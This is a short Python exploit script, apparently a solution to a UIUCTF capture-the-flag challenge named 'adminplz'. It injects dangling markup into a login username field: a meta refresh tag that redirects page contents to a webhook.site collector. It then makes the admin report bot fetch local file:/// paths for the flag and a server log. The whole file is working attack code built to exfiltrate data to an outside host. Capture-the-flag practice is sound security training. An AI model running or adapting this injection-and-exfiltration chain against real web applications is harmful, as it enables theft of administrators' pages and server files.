import requests
import time
from tqdm import tqdm


def waiting_time():
  for i in tqdm(range(5*61)):
    time.sleep(1)
URL = "https://webhook.site/359d4ebb-2880-4b02-a81d-420a870d327d"
BASE = "https://inst-46a4339986330ecc.adminplz.chal.uiuc.tf"

# start Dangling Markup Injection
r_first = requests.post(BASE + "/login", data={"username": f"""<meta http-equiv="refresh" content="4; URL='{URL}/?data=""", "password": "admin"})
assert r_first.status_code == 200, r_first.text
r_second = requests.get(BASE + "/admin?view=flag", cookies=r_first.cookies)

print("Finish Step 1")

time.sleep(1)

# admin send request
r_third = requests.post(BASE + "/report", data={"url": "http://127.0.0.1:8080/admin?view=file:///flag.html"})
print(r_third.text)
print("Finish Step 2")
time.sleep(1)

# end Dangling Markup Injection
r_fourth = requests.post(BASE + "/login", data={"username": """'">""", "password": "admin"})
assert r_fourth.status_code == 200, r_fourth.text
r_fifth = requests.get(BASE + "/admin?view=flag", cookies=r_fourth.cookies)
print("Finish Step 3")

waiting_time()

# request to file log
r_sixth = requests.post(BASE + "/report", data={"url": "http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log"})

print(r_sixth.text)
print("DONE!")